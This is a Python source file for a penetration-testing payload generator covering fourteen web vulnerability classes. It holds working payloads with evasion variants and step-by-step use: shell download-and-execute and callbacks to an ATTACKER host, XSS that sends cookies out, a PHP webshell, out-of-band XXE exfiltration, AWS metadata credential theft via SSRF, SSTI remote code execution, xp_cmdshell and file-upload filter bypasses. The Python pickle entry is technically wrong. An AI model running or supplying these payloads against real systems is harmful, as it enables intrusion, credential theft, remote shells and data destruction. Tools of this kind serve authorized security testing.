"""
Payload Generator — contextual payload generation for common vulnerability classes.
Produces payloads with test cases, risk ratings, and evasion variants.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class VulnClass(str, Enum):
    RCE              = "rce"
    SQLI             = "sqli"
    XSS              = "xss"
    LFI              = "lfi"
    SSRF             = "ssrf"
    SSTI             = "ssti"
    XXE              = "xxe"
    CMD_INJECTION    = "cmd_injection"
    OPEN_REDIRECT    = "open_redirect"
    PATH_TRAVERSAL   = "path_traversal"
    FILE_UPLOAD      = "file_upload"
    IDOR             = "idor"
    JWT_ATTACK       = "jwt_attack"
    DESERIALIZATION  = "deserialization"


@dataclass
class Payload:
    value:       str
    description: str
    risk:        str          # CRITICAL / HIGH / MEDIUM / LOW
    context:     str          # where to use it
    evasion:     list[str]    = field(default_factory=list)
    test_steps:  list[str]    = field(default_factory=list)
    indicators:  list[str]    = field(default_factory=list)   # signs of success


@dataclass
class PayloadSet:
    vuln_class:    VulnClass
    target_tech:   str
    payloads:      list[Payload]
    recommendations: list[str]  = field(default_factory=list)
    risk_rating:   str = "HIGH"

    def to_dict(self) -> dict[str, Any]:
        return {
            "vuln_class":       self.vuln_class.value,
            "target_tech":      self.target_tech,
            "risk_rating":      self.risk_rating,
            "payload_count":    len(self.payloads),
            "payloads": [
                {
                    "value":       p.value,
                    "description": p.description,
                    "risk":        p.risk,
                    "context":     p.context,
                    "evasion":     p.evasion,
                    "test_steps":  p.test_steps,
                    "indicators":  p.indicators,
                }
                for p in self.payloads
            ],
            "recommendations": self.recommendations,
        }


class PayloadGenerator:

    def generate(
        self,
        vuln_class: str,
        target_tech: str = "",
        context: str = "",
    ) -> PayloadSet:
        """Generate a PayloadSet for the given vulnerability class and technology."""
        try:
            vc = VulnClass(vuln_class.lower())
        except ValueError:
            vc = VulnClass.RCE

        generators = {
            VulnClass.RCE:            self._rce,
            VulnClass.SQLI:           self._sqli,
            VulnClass.XSS:            self._xss,
            VulnClass.LFI:            self._lfi,
            VulnClass.SSRF:           self._ssrf,
            VulnClass.SSTI:           self._ssti,
            VulnClass.XXE:            self._xxe,
            VulnClass.CMD_INJECTION:  self._cmd_injection,
            VulnClass.OPEN_REDIRECT:  self._open_redirect,
            VulnClass.PATH_TRAVERSAL: self._path_traversal,
            VulnClass.FILE_UPLOAD:    self._file_upload,
            VulnClass.IDOR:           self._idor,
            VulnClass.JWT_ATTACK:     self._jwt_attack,
            VulnClass.DESERIALIZATION:self._deserialization,
        }
        return generators[vc](target_tech, context)

    # ─── RCE ─────────────────────────────────────────────────────────────────

    def _rce(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(
                value="; id",
                description="Basic command separator RCE test",
                risk="CRITICAL",
                context="Any input field passed to shell",
                evasion=["; i''d", ";i\\d", "$(id)"],
                test_steps=["Inject into parameter", "Check response for uid="],
                indicators=["uid=", "root", "www-data"],
            ),
            Payload(
                value="$(id)",
                description="Command substitution RCE",
                risk="CRITICAL",
                context="Shell-interpreted parameter",
                evasion=["`id`", "${IFS}id", "$((id))"],
                test_steps=["Inject in GET/POST param", "Look for command output in response"],
                indicators=["uid=", "gid="],
            ),
            Payload(
                value="| curl http://COLLABORATOR/?q=$(whoami)",
                description="Out-of-band RCE detection via DNS/HTTP callback",
                risk="CRITICAL",
                context="Blind RCE — no output in response",
                test_steps=["Set up collaborator/interactsh listener", "Inject payload", "Monitor for callback"],
                indicators=["HTTP request received at listener", "DNS query received"],
            ),
            Payload(
                value="'; wget http://ATTACKER/shell.sh -O /tmp/s; bash /tmp/s;",
                description="Shell download and execute",
                risk="CRITICAL",
                context="Confirmed RCE — deploy reverse shell",
                test_steps=["Host shell.sh on attacker server", "Inject payload", "Wait for connection"],
                indicators=["Reverse shell connection received"],
            ),
        ]
        if "php" in tech.lower():
            payloads.append(Payload(
                value="<?php system($_GET['cmd']); ?>",
                description="PHP webshell payload",
                risk="CRITICAL",
                context="PHP file inclusion or upload",
                test_steps=["Upload/inject the payload", "Access via ?cmd=id"],
                indicators=["uid=", "command output in response"],
            ))
        return PayloadSet(VulnClass.RCE, tech, payloads, [
            "Always test in a controlled environment",
            "Use out-of-band callback for blind RCE",
            "Escalate to reverse shell only with explicit authorization",
        ], "CRITICAL")

    # ─── SQL Injection ────────────────────────────────────────────────────────

    def _sqli(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(
                value="'",
                description="Basic single-quote SQLi probe",
                risk="HIGH",
                context="Any user-supplied string input",
                evasion=["''", "\\x27", "%27", "&#39;"],
                test_steps=["Inject into parameter", "Look for SQL error or behaviour change"],
                indicators=["SQL syntax error", "MySQL", "ORA-", "MSSQL", "PostgreSQL"],
            ),
            Payload(
                value="' OR '1'='1",
                description="Classic OR-based authentication bypass",
                risk="CRITICAL",
                context="Login forms and WHERE clause injection",
                evasion=["' OR 1=1--", "' OR 'x'='x", "admin'--"],
                test_steps=["Inject as username", "Leave password blank or any", "Check for login bypass"],
                indicators=["Logged in as admin", "Welcome", "Dashboard"],
            ),
            Payload(
                value="' UNION SELECT NULL,NULL,NULL--",
                description="UNION-based column count detection",
                risk="HIGH",
                context="Reflected SQL injection",
                test_steps=["Increment NULLs until no error", "Then extract data"],
                indicators=["No error returned", "Null values in response"],
            ),
            Payload(
                value="' AND SLEEP(5)--",
                description="Time-based blind SQLi (MySQL)",
                risk="HIGH",
                context="Blind SQLi — no visible output",
                evasion=["' AND SLEEP(5)#", "';WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(5)--"],
                test_steps=["Inject and measure response time", "If >5s delay, SQLi confirmed"],
                indicators=["Response delayed by 5 seconds"],
            ),
            Payload(
                value="'; DROP TABLE users--",
                description="Destructive SQL — DO NOT USE without explicit permission",
                risk="CRITICAL",
                context="Confirmed write access SQLi — destructive",
                test_steps=["Only for authorized destructive testing"],
                indicators=["Table deleted"],
            ),
        ]
        db_specific: dict[str, list[Payload]] = {
            "mysql": [Payload("' UNION SELECT table_name FROM information_schema.tables--", "MySQL table enumeration", "HIGH", "MySQL databases", test_steps=["Extract table names"], indicators=["Table names in response"])],
            "mssql": [Payload("'; EXEC xp_cmdshell('whoami')--", "MSSQL xp_cmdshell RCE", "CRITICAL", "MSSQL with xp_cmdshell enabled", test_steps=["Inject payload", "Check for command output"], indicators=["Command output", "whoami result"])],
            "postgresql": [Payload("'; COPY (SELECT '') TO PROGRAM 'id'--", "PostgreSQL COPY TO PROGRAM RCE", "CRITICAL", "PostgreSQL with superuser", test_steps=["Inject", "Monitor for execution"], indicators=["Command executed"])],
        }
        for db, extra in db_specific.items():
            if db in tech.lower():
                payloads.extend(extra)
        return PayloadSet(VulnClass.SQLI, tech, payloads, [
            "Use sqlmap --level=3 --risk=2 for automated detection",
            "Always test error-based first, then blind",
            "Extract database version before data",
        ], "CRITICAL")

    # ─── XSS ─────────────────────────────────────────────────────────────────

    def _xss(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(
                value="<script>alert(1)</script>",
                description="Basic reflected XSS probe",
                risk="HIGH",
                context="Any reflected user input in HTML",
                evasion=['<img src=x onerror=alert(1)>', '<svg onload=alert(1)>', '"><script>alert(1)</script>'],
                test_steps=["Inject into every input field and URL parameter", "Check if payload executes"],
                indicators=["Alert box appears", "Script executes in browser"],
            ),
            Payload(
                value='"><img src=x onerror="fetch(\'http://ATTACKER/c?\'+document.cookie)">',
                description="Cookie theft via XSS",
                risk="CRITICAL",
                context="Stored or reflected XSS",
                test_steps=["Host listener on ATTACKER", "Trigger XSS", "Capture cookies"],
                indicators=["Cookie received at listener"],
            ),
            Payload(
                value="javascript:alert(document.domain)",
                description="DOM XSS via javascript: URI",
                risk="HIGH",
                context="href/src attributes accepting user input",
                test_steps=["Inject as href value", "Click the link"],
                indicators=["Alert shows domain name"],
            ),
            Payload(
                value='<svg/onload=eval(atob("YWxlcnQoMSk="))>',
                description="Base64-encoded XSS bypass",
                risk="HIGH",
                context="Filters blocking alert keyword",
                evasion=['<svg onload=setTimeout`alert\\x281\\x29`>', '<img src onerror=&#97;&#108;&#101;&#114;&#116;(1)>'],
                test_steps=["Inject when filters are in place", "Check if base64 encoding bypasses filter"],
                indicators=["Alert box appears despite filtering"],
            ),
        ]
        return PayloadSet(VulnClass.XSS, tech, payloads, [
            "Use Dalfox for automated XSS discovery",
            "Test all contexts: HTML, attribute, JavaScript, URL",
            "Stored XSS is more severe — always prioritize",
        ], "HIGH")

    # ─── LFI ─────────────────────────────────────────────────────────────────

    def _lfi(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(
                value="../../../etc/passwd",
                description="Basic path traversal to /etc/passwd",
                risk="HIGH",
                context="File inclusion parameters (page=, file=, include=)",
                evasion=["....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252F..%252Fetc%252Fpasswd"],
                test_steps=["Inject in file parameter", "Check if /etc/passwd content appears"],
                indicators=["root:x:0:0:", "daemon:", "bin:"],
            ),
            Payload(
                value="../../../etc/shadow",
                description="Password hash file",
                risk="CRITICAL",
                context="LFI with root read permission",
                test_steps=["Inject path", "Check for hash format"],
                indicators=["$6$", "$y$", "root:"],
            ),
            Payload(
                value="/proc/self/environ",
                description="Process environment variables — can lead to RCE via PHP",
                risk="CRITICAL",
                context="PHP LFI to RCE via environ injection",
                test_steps=["Include /proc/self/environ", "Inject PHP via User-Agent header"],
                indicators=["HTTP_USER_AGENT", "PATH="],
            ),
            Payload(
                value="php://filter/convert.base64-encode/resource=index.php",
                description="PHP filter wrapper — read source code",
                risk="HIGH",
                context="PHP file inclusion",
                test_steps=["Inject as file parameter", "Decode base64 response"],
                indicators=["Base64 encoded PHP source"],
            ),
            Payload(
                value="../../../var/log/apache2/access.log",
                description="Log poisoning — inject PHP into log then include",
                risk="CRITICAL",
                context="LFI to RCE via log poisoning",
                test_steps=["Send request with PHP in User-Agent", "Include the log file"],
                indicators=["PHP executed", "Command output in log"],
            ),
        ]
        return PayloadSet(VulnClass.LFI, tech, payloads, [
            "Always try PHP wrapper variants",
            "Log poisoning is a reliable LFI-to-RCE path",
            "Test /proc/self/fd/* for file descriptor leaks",
        ], "HIGH")

    # ─── SSRF ────────────────────────────────────────────────────────────────

    def _ssrf(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(
                value="http://127.0.0.1/",
                description="Basic SSRF — localhost access",
                risk="HIGH",
                context="URL parameters (url=, dest=, redirect=, uri=)",
                evasion=["http://0.0.0.0/", "http://[::1]/", "http://localhost/", "http://0/"],
                test_steps=["Inject as URL parameter", "Check if localhost content returned"],
                indicators=["Internal service response", "Connection refused from internal IP"],
            ),
            Payload(
                value="http://169.254.169.254/latest/meta-data/",
                description="AWS IMDSv1 metadata — CRITICAL for cloud",
                risk="CRITICAL",
                context="SSRF in AWS-hosted applications",
                test_steps=["Inject URL", "Check for AWS metadata keys"],
                indicators=["ami-id", "instance-id", "iam/security-credentials"],
            ),
            Payload(
                value="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                description="AWS IAM credential theft via SSRF",
                risk="CRITICAL",
                context="AWS SSRF with metadata access",
                test_steps=["Get role name from previous request", "Fetch credentials"],
                indicators=["AccessKeyId", "SecretAccessKey", "Token"],
            ),
            Payload(
                value="file:///etc/passwd",
                description="SSRF to file:// — local file read",
                risk="HIGH",
                context="SSRF with file:// scheme support",
                evasion=["file://localhost/etc/passwd", "file:///etc/shadow"],
                test_steps=["Inject file:// URL", "Check if file content returned"],
                indicators=["root:x:0:0:"],
            ),
            Payload(
                value="dict://127.0.0.1:6379/info",
                description="SSRF to Redis via dict:// scheme",
                risk="HIGH",
                context="SSRF targeting internal Redis",
                test_steps=["Inject dict:// URL", "Check for Redis INFO response"],
                indicators=["redis_version", "connected_clients"],
            ),
        ]
        return PayloadSet(VulnClass.SSRF, tech, payloads, [
            "AWS SSRF to metadata is an automatic P1/Critical finding",
            "Test all URL schemes: http, https, file, dict, gopher, ftp",
            "Use Burp Collaborator for blind SSRF detection",
        ], "CRITICAL")

    # ─── SSTI ────────────────────────────────────────────────────────────────

    def _ssti(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(
                value="{{7*7}}",
                description="Universal SSTI probe — should return 49",
                risk="HIGH",
                context="Template engines (Jinja2, Twig, Freemarker, etc.)",
                test_steps=["Inject into template parameter", "If 49 returned — SSTI confirmed"],
                indicators=["49 in response"],
            ),
            Payload(
                value="{{config.items()}}",
                description="Jinja2 config dump",
                risk="HIGH",
                context="Jinja2 (Flask/Django)",
                test_steps=["Inject into template", "Look for Flask secret key"],
                indicators=["SECRET_KEY", "DATABASE_URL"],
            ),
            Payload(
                value="{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}",
                description="Jinja2 RCE via subprocess",
                risk="CRITICAL",
                context="Jinja2 SSTI — command execution",
                test_steps=["Inject into Jinja2 template context", "Adjust subclass index if needed"],
                indicators=["uid=", "command output"],
            ),
            Payload(
                value="${7*7}",
                description="Freemarker / Spring SSTI probe",
                risk="HIGH",
                context="Java template engines",
                evasion=["#{7*7}", "<%= 7*7 %>"],
                test_steps=["Try different syntax to identify engine"],
                indicators=["49 in response"],
            ),
            Payload(
                value="{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                description="Twig RCE (PHP)",
                risk="CRITICAL",
                context="Twig template engine",
                test_steps=["Inject into Twig context", "Check command output"],
                indicators=["uid=", "command output"],
            ),
        ]
        return PayloadSet(VulnClass.SSTI, tech, payloads, [
            "Always determine template engine before RCE payloads",
            "{{7*7}} then {{7*'7'}} helps distinguish Jinja2 from Twig",
            "SSTI is almost always Critical severity",
        ], "CRITICAL")

    # ─── XXE ─────────────────────────────────────────────────────────────────

    def _xxe(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(
                value='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                description="Classic XXE file read",
                risk="HIGH",
                context="Any XML parser accepting user input",
                test_steps=["Replace XML body with payload", "Check for /etc/passwd in response"],
                indicators=["root:x:0:0:", "daemon:"],
            ),
            Payload(
                value='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://ATTACKER/xxe">]><root>&xxe;</root>',
                description="Out-of-band XXE via HTTP callback",
                risk="HIGH",
                context="Blind XXE — no output in response",
                test_steps=["Set up HTTP listener on ATTACKER", "Inject payload", "Monitor for request"],
                indicators=["HTTP request received at listener"],
            ),
            Payload(
                value='<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ATTACKER/evil.dtd">%remote;]>',
                description="Parameter entity XXE for blind data exfil",
                risk="CRITICAL",
                context="Blind XXE via external DTD",
                test_steps=["Host evil.dtd with exfil payload", "Inject", "Monitor listener"],
                indicators=["Data received at external server"],
            ),
        ]
        return PayloadSet(VulnClass.XXE, tech, payloads, [
            "Test all XML endpoints including SOAP and file uploads",
            "Blind XXE via OOB is the most reliable technique",
            "SVG and office document uploads often have XXE",
        ], "HIGH")

    # ─── Command Injection ────────────────────────────────────────────────────

    def _cmd_injection(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(value="; id", description="Semicolon separator", risk="CRITICAL", context="Shell-executed parameters", evasion=[";i''d", "$(id)", "`id`"]),
            Payload(value="| id", description="Pipe separator", risk="CRITICAL", context="Piped command execution", evasion=["||id", "|i\\d"]),
            Payload(value="$(id)", description="Command substitution", risk="CRITICAL", context="Variable expansion contexts"),
            Payload(value="& id", description="Background execution", risk="CRITICAL", context="Windows command injection", evasion=["&id", "&&id"]),
            Payload(value="\n id", description="Newline separator", risk="HIGH", context="Multi-line inputs"),
        ]
        return PayloadSet(VulnClass.CMD_INJECTION, tech, payloads, ["Test all separators: ; | & `` $() \\n", "Use OOB ping/curl for blind detection"], "CRITICAL")

    # ─── Open Redirect ────────────────────────────────────────────────────────

    def _open_redirect(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(value="//evil.com", description="Protocol-relative redirect", risk="MEDIUM", context="redirect= url= next= return= parameters"),
            Payload(value="https://evil.com", description="Absolute redirect", risk="MEDIUM", context="URL redirect parameters"),
            Payload(value="/\\evil.com", description="Backslash bypass", risk="MEDIUM", context="URL redirect with path validation"),
            Payload(value="https://VICTIM@evil.com", description="URL credential bypass", risk="MEDIUM", context="Redirect with @ parsing tricks"),
        ]
        return PayloadSet(VulnClass.OPEN_REDIRECT, tech, payloads, ["Chain with phishing for higher impact", "Combined with SSRF for critical findings"], "MEDIUM")

    # ─── Path Traversal ───────────────────────────────────────────────────────

    def _path_traversal(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(value="../../../etc/passwd", description="Unix path traversal", risk="HIGH", context="File path parameters", evasion=["..%2F..%2F..%2Fetc%2Fpasswd", "....//....//etc/passwd"]),
            Payload(value="..\\..\\..\\windows\\win.ini", description="Windows path traversal", risk="HIGH", context="Windows file parameters"),
            Payload(value="%00../../../etc/passwd", description="Null byte bypass", risk="HIGH", context="PHP null byte truncation"),
        ]
        return PayloadSet(VulnClass.PATH_TRAVERSAL, tech, payloads, ["Try URL encoding, double encoding, null bytes", "Test on download/file endpoints"], "HIGH")

    # ─── File Upload ─────────────────────────────────────────────────────────

    def _file_upload(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(value="shell.php", description="Direct PHP webshell upload", risk="CRITICAL", context="Unrestricted file upload", test_steps=["Upload file", "Browse to /uploads/shell.php?cmd=id"], indicators=["Command output"]),
            Payload(value="shell.php.jpg", description="Double extension bypass", risk="CRITICAL", context="Extension whitelist bypass", evasion=["shell.phtml", "shell.php5", "shell.pHp"]),
            Payload(value="shell.jpg (with PHP content and GIF89a header)", description="Magic bytes bypass", risk="CRITICAL", context="Content-type or magic byte validation bypass", test_steps=["Add GIF89a header", "Set Content-Type: image/gif", "Upload PHP payload"]),
            Payload(value='Content-Type: image/png with PHP body', description="Content-Type spoofing", risk="HIGH", context="Content-Type only validation"),
            Payload(value="../../../var/www/html/shell.php", description="Path traversal in filename", risk="CRITICAL", context="Filename passed to server path"),
        ]
        return PayloadSet(VulnClass.FILE_UPLOAD, tech, payloads, ["Test all bypass: extension, content-type, magic bytes, null byte", "SVG files can carry XSS payloads", "Always test file execution after upload"], "CRITICAL")

    # ─── IDOR ────────────────────────────────────────────────────────────────

    def _idor(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(value="Change id=123 to id=124", description="Sequential IDOR", risk="HIGH", context="ID-based resource access", test_steps=["Change numeric ID", "Check if another user's data is returned"]),
            Payload(value="Encode ID in base64 and modify", description="Encoded IDOR", risk="HIGH", context="Base64-encoded object references"),
            Payload(value="Swap user ID in JWT body", description="JWT IDOR", risk="CRITICAL", context="JWT-based auth with user IDs", test_steps=["Decode JWT", "Change user_id", "Re-sign or test without signature"]),
            Payload(value="Use victim account ID in API endpoint", description="API IDOR", risk="HIGH", context="REST API resource endpoints", test_steps=["Enumerate user IDs", "Access /api/users/{id}/profile"]),
        ]
        return PayloadSet(VulnClass.IDOR, tech, payloads, ["Always test horizontal and vertical privilege escalation", "Check indirect references (hash, UUID)", "IDOR in API is often overlooked"], "HIGH")

    # ─── JWT Attack ───────────────────────────────────────────────────────────

    def _jwt_attack(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(value='{"alg":"none"}', description="None algorithm bypass", risk="CRITICAL", context="JWT with algorithm validation disabled", test_steps=["Change alg to none", "Remove signature", "Send modified token"]),
            Payload(value='Brute-force HS256 secret with hashcat', description="Weak secret brute-force", risk="CRITICAL", context="HS256 JWT with weak secret", test_steps=["Extract token", "Run: hashcat -a 0 -m 16500 token.txt wordlist.txt"]),
            Payload(value='Change RS256 to HS256 and sign with public key', description="Algorithm confusion attack", risk="CRITICAL", context="JWT using RS256"),
            Payload(value='{"kid":"../../dev/null"}', description="Key injection via kid header", risk="CRITICAL", context="JWT with kid parameter", test_steps=["Set kid to /dev/null", "Sign with empty secret"]),
        ]
        return PayloadSet(VulnClass.JWT_ATTACK, tech, payloads, ["Use jwt_tool for automated JWT attacks", "alg:none is always worth testing first", "RS256 to HS256 confusion is a common critical finding"], "CRITICAL")

    # ─── Deserialization ──────────────────────────────────────────────────────

    def _deserialization(self, tech: str, ctx: str) -> PayloadSet:
        payloads = [
            Payload(value="ysoserial CommonsCollections1 payload", description="Java deserialization RCE via ysoserial", risk="CRITICAL", context="Java applications with deserialization endpoints", test_steps=["Generate with ysoserial", "Send as serialized object", "Check for callback"]),
            Payload(value="pickle.loads(os.system('id'))", description="Python pickle deserialization RCE", risk="CRITICAL", context="Python pickle deserialization"),
            Payload(value="O:8:\"stdClass\":0:{}", description="PHP object injection probe", risk="HIGH", context="PHP unserialize() calls", test_steps=["Inject serialized PHP object", "Target __wakeup or __destruct magic methods"]),
        ]
        return PayloadSet(VulnClass.DESERIALIZATION, tech, payloads, ["Use ysoserial for Java, pickle for Python", "Look for serialized data in cookies, parameters, and headers", "Deserialization RCE is always Critical"], "CRITICAL")

    # ─── File Upload Extended ─────────────────────────────────────────────────

    def generate_upload_bypass_set(self, server_tech: str) -> dict[str, list[str]]:
        """Return a full set of file upload bypass filenames and techniques."""
        extensions: list[str] = []
        if "php" in server_tech.lower():
            extensions = ["php", "php3", "php4", "php5", "php7", "phtml", "pht",
                          "php.jpg", "php%00.jpg", "php\x00.jpg"]
        elif "asp" in server_tech.lower():
            extensions = ["asp", "aspx", "asa", "cer", "cdx", "asp;.jpg", "asp%00.jpg"]
        elif "jsp" in server_tech.lower():
            extensions = ["jsp", "jspx", "jsw", "jsv", "jspf"]
        else:
            extensions = ["php", "asp", "aspx", "jsp", "cgi", "pl", "py", "sh"]

        return {
            "extensions":         extensions,
            "content_type_bypass": ["image/jpeg", "image/png", "image/gif", "application/octet-stream"],
            "magic_bytes":        ["GIF89a", "\x89PNG\r\n\x1a\n", "\xff\xd8\xff"],
            "bypass_techniques":  [
                "Double extension: shell.php.jpg",
                "Null byte: shell.php%00.jpg",
                "Case variation: shell.PhP",
                "Content-Type spoofing: send image/jpeg with PHP body",
                "Magic bytes prepend: GIF89a<?php system($_GET['c']); ?>",
            ],
        }
